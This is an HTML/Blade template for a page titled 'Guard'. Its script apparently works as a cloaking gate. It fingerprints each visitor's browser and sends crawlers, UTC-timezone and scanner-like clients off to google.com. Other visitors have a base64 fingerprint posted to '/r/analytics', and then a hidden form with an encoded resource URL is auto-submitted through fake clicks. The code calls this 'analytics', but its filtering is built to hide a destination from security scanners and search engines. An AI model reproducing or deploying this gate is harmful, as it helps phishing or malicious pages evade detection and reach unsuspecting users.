<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>Guard</title>
    <meta name="description" content="Simple Landing Page"/>
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    animation: {
                        'bounce-slow': 'bounce 3s linear infinite',
                    }
                }
            }
        }
    </script>
    <script>
        let metricsWereSent = false;
        let pageLoadTime = Date.now();
        let hasInteracted = false;

        function showLoader(element) {
            return;
            if (element.querySelector('.universal-loader')) return;

            element.dataset.originalContent = element.innerHTML;

            element.innerHTML = `
                <div class="universal-loader inline-flex items-center">
                    <svg class="animate-spin -ml-1 mr-3 h-5 w-5" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                        <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                        <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                    </svg>
                    Processing...
                </div>
            `;
        }

        function hideLoader(element) {
            return
            if (element.dataset.originalContent) {
                element.innerHTML = element.dataset.originalContent;
                delete element.dataset.originalContent;
            }
        }

        function checkBrowserFeatures() {
            const features = {
                hasWebGL: false,
                hasCrypto: false,
                hasServiceWorker: false,
                hasWebRTC: false,
                hasCanvas: false,
                hasWebSocket: false,
                hasWorker: false
            };

            try {
                // WebGL
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                features.hasWebGL = !!gl;

                // API checks
                features.hasCrypto = typeof window.crypto !== 'undefined';
                features.hasServiceWorker = 'serviceWorker' in navigator;
                features.hasWebRTC = 'RTCPeerConnection' in window;
                features.hasCanvas = !!document.createElement('canvas').getContext;
                features.hasWebSocket = 'WebSocket' in window;
                features.hasWorker = 'Worker' in window;

                return features;
            } catch (e) {
                return features;
            }
        }

        const getMetrics = () => {
            return {
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                language: navigator.language,
                platform: navigator.platform,
                timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                features: checkBrowserFeatures()
            };
        };

        function isValidUserAgent(ua) {
            const botPatterns = [
                'bot', 'spider', 'crawl', 'APIs-Google', 'AdsBot',
                'Googlebot', 'mediapartners', 'Google Favicon',
                'FeedFetcher', 'Google-Read-Aloud',
                'DuplexWeb-Google', 'googleweblight',
                'bing', 'yandex', 'baidu', 'slurp',
                'duckduck', 'baiduspider', 'facebot',
                'facebookexternalhit', 'ia_archiver'
            ].some(bot => ua.toLowerCase().includes(bot));

            if (botPatterns) return false;

            const isMobile = /Mobile|Android|iPhone/i.test(ua);
            const resolution = `${window.screen.width}x${window.screen.height}`;
            if (isMobile && resolution.split('x')[0] === resolution.split('x')[1] || resolution === '800x600') {
                return false;
            }

            return true;
        }

        async function sendMetricsToAnalytics(metrics) {

            const ua = navigator.userAgent;
            if (!metrics.features.hasWebGL || !isValidUserAgent(ua) || metrics.timeZone === 'UTC') {
                window.location.href = 'https://www.google.com';
                return false;
            }

            let a = await fetch('/r/analytics', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-Requested-With': 'XMLHttpRequest'
                },
                body: JSON.stringify({
                    metrics: btoa(JSON.stringify(metrics)),
                    uh: '{{ $user_unique_hash }}',
                    fd: '{{ $first_data }}',
                })
            });
            if (a.status === 200) {
                const targetElement = document.querySelector('.my-view');
                targetElement.innerHTML = '<div class="my-check"></div>';
            }

        }

        async function handleClick(event, element, metrics) {
            event.preventDefault();
            showLoader(element);

            try {

                const encodedResource = element.dataset.resource;
                const data = {
                    'metrics': btoa(JSON.stringify(metrics)),
                    'url': encodedResource,
                    'uh': '{{ $user_unique_hash }}',
                    'fd': '{{ $first_data }}',
                };

                // window.history.pushState(null, '', '/');
                // window.onpopstate = function () {
                //     window.history.pushState(null, '', '/');
                // };

                // Создаем и отправляем форму только после успешной отправки аналитики
                const form = document.createElement('form');
                form.method = 'POST';
                form.action = '/r/confirm';
                form.style.display = 'none';
                Object.entries(data).forEach(([key, value]) => {
                    const input = document.createElement('input');
                    input.type = 'hidden';
                    input.name = key;
                    input.value = value;
                    form.appendChild(input);
                });

                const token = document.createElement('input');
                token.type = 'hidden';
                token.name = '_token';
                token.value = document.querySelector('meta[name="csrf-token"]')?.content || '';
                form.appendChild(token);

                document.body.appendChild(form);
                form.submit();

            } catch (e) {
                console.error('Error:', e);
                hideLoader(element);
                return false;
            }
        }

        document.addEventListener('mousemove', () => hasInteracted = true);
        document.addEventListener('touchstart', () => hasInteracted = true);
        document.addEventListener('scroll', () => hasInteracted = true);
        const metrics = getMetrics();
        document.addEventListener('DOMContentLoaded', async () => {

            await sendMetricsToAnalytics(metrics);
            document.querySelectorAll('[data-resource]').forEach(element => {
                element.style.cursor = 'pointer';
                element.addEventListener('click', (e) => handleClick(e, element, metrics));
            });
        });

        document.addEventListener('DOMContentLoaded', function () {
            const checkElement = setInterval(function () {
                const targetElement = document.querySelector('.my-check');
                if (targetElement) {
                    clearInterval(checkElement);

                    document.querySelectorAll('[data-resource]').forEach(element => {
                        const mockEvent = new Event('click', {
                            bubbles: true,
                            cancelable: true
                        });
                        setTimeout(async function () {
                            await handleClick(mockEvent, element, metrics);
                        }, 1000);
                    });

                }
            }, 1000);
        });
    </script>
</head>
<body>
@yield('content')
<style>

    .universal-loader {
        animation: fadeIn 0.3s ease-out forwards;
    }

    @keyframes spin {
        from {
            transform: rotate(0deg);
        }
        to {
            transform: rotate(360deg);
        }
    }
</style>
</body>
</html>
